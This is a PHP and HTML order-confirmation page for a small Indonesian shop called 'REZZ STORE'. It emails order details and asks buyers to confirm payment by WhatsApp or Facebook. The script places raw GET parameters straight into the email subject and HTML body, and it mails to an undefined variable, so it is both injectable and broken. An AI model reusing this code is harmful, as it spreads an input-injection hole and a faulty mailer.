<?php
 $timestamp = date('d/m/Y h:i:s');

	$produk 	= $_GET['produk'];
	$harga 		= $_GET['harga'];
	$bayar		= $_GET['bayar'];


$subject = "$produk Bayar  $bayar";
$message = '
<center>
<div style="margin-top:10px;margin-bottom:10px;border-radius:1px;padding:5px;width:100%;background:#fff;color:white;text-align:center;">
<table width=100% align=center >
	<thead>
		<tr >
			<th style="height: 50px; color:white;padding:0px;background:#1ed0ff; text-align:center;">
				Orderan '.$produk.'
			</th>
		</tr>
	</thead>
	<tbody>
		<tr>
			<td align=left style="color:#24291D;padding:10px;background:white">
				<center><font style="color:#000; margin: 8px;">=== Orderan Boss ===</font></center>
				<br><br>
				<font style="color:#000; margin: 8px;"><b>• Yg di Beli	:</b></font> '.$produk.'
				<br><br>
				<font style="color:#000; margin: 8px;"><b>• Total	:</b></font> '.$harga.'
				<br><br>
				<font style="color:#000; margin: 8px;"><b>• Pakai	:</b></font> '.$bayar.'
				<br><br>
				<font style="color:#000; margin: 8px;"><b>• Waktu	:</b></font> '.$timestamp.'
			</td>
		</tr>
	</tbody>
	</table>
<div style="border-radius:3px;border-bottom:2px solid white;padding:5px;width:100%;background:#1ed0ff;color:white;text-align:center;"><font size=3 color=white><b> 2020</b></font></div>
</div>
</center>
';


$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: Ada Pembeli Nih Boss <crreza05@gmail.com>' . "\r\n";
$datamail = mail($result,$subject, $message, $headersx);
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="Description" content="SITE REZZ GANZ">
	<meta property="og:type" content="website">
	<meta property="og:title" content="SITE REZZ GANZ">
	<meta property="og:description" content="By Rezz19 Ganz">
	<meta property="og:image" content="https://i.ibb.co/NnZYWcz/540718bc7c9d.jpg">
	<link rel="icon" type="image/png" href="https://i.ibb.co/NnZYWcz/540718bc7c9d.jpg">
	<link rel="stylesheet" href="path/to/font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	
	<link rel="stylesheet" href="../../css/style.css">
<title>REZZ STORE</title>
</head>


<body>

	<div class="box">


<div class="nav">
REZZ STORE
</div>
<br><br>
<div style="background:#1ed0ff; margin-top: 5%; color: #fff;">
<center>
	<i class="fa fa-html5 fa-1g" aria-hidden="true" style="margin-right: 10px;"></i>
		<span class="fa-stack fa-lg">
		<i class="fa fa-square fa-stack-2x" style="color: #000;"></i>
		<i class="fa fa-code fa-stack-1x fa-inverse"></i>
		</span>
	<i class="fa fa-css3 fa-1g" aria-hidden="true" style="margin-left: 10px;"></i>
</center>
</div>

<div class="garis-home"></div>
<div class="solusi"><i class="fa fa-check-square-o fa-2x" aria-hidden="true"></i>  Konfirmasi</div>
<center>
<div class="cart">

<div class="pilihan">Silahkan konfirmasi lewat</div>
	<div class="whatsapp2" onclick="location.href='https://wa.me/6281313726400';">
	<i class="fa fa-whatsapp fa-1g" aria-hidden="true" style="color: #fff;"></i> Whatsapp
	</div>
	<div class="facebook2" onclick="location.href='https://web.facebook.com/GADA/';">
	<i class="fa fa-facebook fa-1g" aria-hidden="true" style="color: #fff;"></i> Facebook
	</div>

<br><br><br>
<b style="color: red;">*</b>Setelah membayar harap konfirmasi lewat Whatsapp/Facebook dan mengirimkan bukti.
</div>

	</div>


<footer style="color: white;">
	<h3> Tentang Kami</h3>
<li>Created by : <a href="https://wa,me6281313726400" style="text-decoration: none;"><i>Rezz19</i></a></li>
<li>Email : <i style="color: white;">galaxypedia@protonmail.com</i></li>
<li>Subscribe :<a href="https://youtube.com/channel/UC8OREtGKNIBBku25tbX5e0A" style="text-decoration: none;"> <i>Youtube Channel</i></a></li>
<li>Follow :<a href="https://instagram.com/ini_rezz19" style="text-decoration: none;"> <i>Instagram</i></a></li>
<br>

<div class="barcode">
REZZ X HOSTING
</div>
</footer>


	

</body>
</html>
